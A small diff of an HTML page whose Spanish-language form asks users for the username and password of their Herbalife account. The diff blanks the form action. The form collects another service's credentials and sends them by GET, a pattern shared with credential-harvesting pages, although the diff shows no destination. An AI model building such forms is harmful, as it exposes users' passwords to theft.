@@ -12,7 +12,7 @@
       <div>
         Por favor registra tu nombre de usuario y contraseña con la que ingresas en tu página de herbalife®.
       </div>
-      <form action="formulario.php" method="get" id="login">
+      <form action="" method="get" id="login">
         <div>
           <label for="id_herbalife">ID HERBALIFE</label><input type="text" name="id_herbalife" value="" id="id_herbalife" />
         </div>
@@ -24,3 +24,4 @@
     </section>
   </body>
 </html>
+
